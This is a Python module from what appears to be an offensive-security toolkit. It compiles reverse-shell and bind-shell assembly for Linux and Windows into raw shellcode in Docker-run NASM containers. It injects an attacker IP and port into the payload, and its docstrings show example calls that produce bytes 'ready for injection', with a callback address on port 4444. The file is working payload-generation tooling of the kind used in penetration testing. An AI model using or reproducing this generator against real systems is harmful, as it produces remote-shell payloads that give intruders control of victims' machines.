"""Docker-based assembly compiler for shellcode generation."""

import logging
import subprocess
import tempfile
from pathlib import Path
from typing import Optional

from ofx.settings import settings

logger = logging.getLogger(settings.app_branding)


class AssemblyCompiler:
    """Docker-based assembly compiler for shellcode generation.

    Compiles .asm source files to raw shellcode bytes using NASM assembler
    running in isolated Docker containers. Supports Linux and Windows targets
    in both x86 and x64 architectures.

    Attributes:
        data_dir: Path to shellcode source directory (data/shellcodes/)

    Example:
        >>> compiler = AssemblyCompiler()
        >>> shellcode = compiler.compile(
        ...     os_target='linux',
        ...     arch='x64',
        ...     shell_type='reverse',
        ...     ip='192.168.1.100',
        ...     port=4444
        ... )
        >>> len(shellcode)
        87
    """

    def __init__(self):
        """Initialize assembly compiler.

        Raises:
            RuntimeError: If shellcode data directory not found
        """
        self.data_dir = Path(__file__).parent.parent / "data" / "shellcodes"
        if not self.data_dir.exists():
            raise RuntimeError(f"Shellcode data directory not found: {self.data_dir}")

    def _get_source_path(self, os_target: str, arch: str, shell_type: str) -> Path:
        """Locate assembly source file for specified target.

        Args:
            os_target: Operating system ('linux', 'windows')
            arch: Architecture ('x86', 'x64')
            shell_type: Shell type ('reverse', 'bind')

        Returns:
            Path to .asm source file

        Raises:
            FileNotFoundError: If source file doesn't exist
        """
        arch_dir = arch if arch == "x64" else ""

        if arch_dir:
            source_dir = self.data_dir / os_target / arch_dir / "src"
        else:
            source_dir = self.data_dir / os_target / "src"

        source_file = source_dir / f"{shell_type}_tcp.asm"

        if not source_file.exists():
            raise FileNotFoundError(
                f"Assembly source not found: {source_file}\n"
                f"Available sources in {self.data_dir}:\n"
                f"  linux/src/*.asm, linux/x64/src/*.asm\n"
                f"  windows/src/*.asm, windows/x64/src/*.asm"
            )

        return source_file

    def _get_dockerfile_path(self, os_target: str, arch: str) -> Path:
        """Locate Dockerfile for building compiler image.

        Args:
            os_target: Operating system ('linux', 'windows')
            arch: Architecture ('x86', 'x64')

        Returns:
            Path to Dockerfile

        Raises:
            FileNotFoundError: If Dockerfile doesn't exist
        """
        arch_dir = arch if arch == "x64" else ""

        if arch_dir:
            dockerfile = self.data_dir / os_target / arch_dir / "Dockerfile"
        else:
            dockerfile = self.data_dir / os_target / "Dockerfile"

        if not dockerfile.exists():
            raise FileNotFoundError(f"Dockerfile not found: {dockerfile}")

        return dockerfile

    def _build_docker_image(self, os_target: str, arch: str) -> str:
        """Build Docker image containing NASM compiler.

        Creates a Docker image with NASM assembler and required dependencies
        for the specified target platform.

        Args:
            os_target: Operating system ('linux', 'windows')
            arch: Architecture ('x86', 'x64')

        Returns:
            Docker image name (e.g., 'ofx-shellcode-linux_x64:latest')

        Raises:
            RuntimeError: If Docker build fails or times out
        """
        arch_suffix = f"_{arch}" if arch == "x64" else ""
        image_name = f"ofx-shellcode-{os_target}{arch_suffix}:latest"

        dockerfile_path = self._get_dockerfile_path(os_target, arch)
        context_dir = dockerfile_path.parent

        logger.info(f"Building Docker image: {image_name}")

        try:
            subprocess.run(
                [
                    "docker",
                    "build",
                    "-t",
                    image_name,
                    "-f",
                    str(dockerfile_path),
                    str(context_dir),
                ],
                check=True,
                capture_output=True,
                timeout=300,
            )
            logger.info(f"Built Docker image: {image_name}")
            return image_name

        except subprocess.CalledProcessError as e:
            error_msg = e.stderr.decode() if e.stderr else str(e)
            raise RuntimeError(f"Docker build failed: {error_msg}")
        except subprocess.TimeoutExpired:
            raise RuntimeError("Docker build timed out after 5 minutes")

    def compile(
        self, os_target: str, arch: str, shell_type: str, ip: str, port: int
    ) -> bytes:
        """Compile assembly source to raw shellcode bytes.

        Builds Docker image if needed, then compiles .asm source file with
        IP and port parameters injected as environment variables.

        Args:
            os_target: Target OS ('linux', 'windows')
            arch: Architecture ('x86', 'x64')
            shell_type: Shell type ('reverse', 'bind')
            ip: IP address for reverse connection
            port: Port number for connection

        Returns:
            Raw shellcode bytes ready for injection

        Raises:
            FileNotFoundError: If source file not found
            RuntimeError: If compilation fails or times out

        Example:
            >>> compiler = AssemblyCompiler()
            >>> sc = compiler.compile('linux', 'x64', 'reverse', '10.0.0.1', 4444)
            >>> sc.hex()[:20]
            '6a29585f6a025f48'
        """
        source_file = self._get_source_path(os_target, arch, shell_type)
        image_name = self._build_docker_image(os_target, arch)

        ip_parts = ip.split(".")
        ip_hex = "0x" + "".join([f"{int(p):02x}" for p in ip_parts])

        port_hex = f"0x{port:04x}"

        logger.info(
            f"Compiling {source_file.name} with IP={ip} ({ip_hex}), PORT={port} ({port_hex})"
        )

        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            output_file = temp_path / "shellcode.bin"

            try:
                subprocess.run(
                    [
                        "docker",
                        "run",
                        "--rm",
                        "-v",
                        f"{source_file.parent}:/src:ro",
                        "-v",
                        f"{temp_path}:/output",
                        "-e",
                        f"IP={ip}",
                        "-e",
                        f"IP_HEX={ip_hex}",
                        "-e",
                        f"PORT={port}",
                        "-e",
                        f"PORT_HEX={port_hex}",
                        image_name,
                        (
                            "/src/compile.sh"
                            if (source_file.parent / "compile.sh").exists()
                            else f"nasm -f bin /src/{source_file.name} -o /output/shellcode.bin"
                        ),
                    ],
                    check=True,
                    capture_output=True,
                    timeout=60,
                )

                if not output_file.exists():
                    raise RuntimeError("Compilation produced no output file")

                shellcode = output_file.read_bytes()
                logger.info(f"Compiled {len(shellcode)} bytes from {source_file.name}")
                return shellcode

            except subprocess.CalledProcessError as e:
                error_msg = e.stderr.decode() if e.stderr else str(e)
                raise RuntimeError(f"Assembly compilation failed: {error_msg}")
            except subprocess.TimeoutExpired:
                raise RuntimeError("Compilation timed out after 60 seconds")

    def list_sources(self) -> dict[str, list[str]]:
        """List all available assembly source files.

        Scans data directory for .asm files organized by OS and architecture.

        Returns:
            Dictionary mapping 'os/arch' to list of shellcode types

        Example:
            >>> compiler.list_sources()
            {
                'linux/x86': ['reverse', 'bind'],
                'linux/x64': ['reverse', 'bind'],
                'windows/x86': ['reverse', 'bind'],
                'windows/x64': ['reverse', 'bind']
            }
        """
        sources = {}

        for os_dir in self.data_dir.iterdir():
            if not os_dir.is_dir() or os_dir.name == "java":
                continue

            os_name = os_dir.name

            src_dir = os_dir / "src"
            if src_dir.exists():
                types = [f.stem.replace("_tcp", "") for f in src_dir.glob("*.asm")]
                if types:
                    sources[f"{os_name}/x86"] = types

            x64_dir = os_dir / "x64" / "src"
            if x64_dir.exists():
                types = [f.stem.replace("_tcp", "") for f in x64_dir.glob("*.asm")]
                if types:
                    sources[f"{os_name}/x64"] = types

        return sources


_assembly_compiler: Optional[AssemblyCompiler] = None


def get_assembly_compiler() -> AssemblyCompiler:
    """Get or create assembly compiler singleton."""
    global _assembly_compiler
    if _assembly_compiler is None:
        _assembly_compiler = AssemblyCompiler()
    return _assembly_compiler
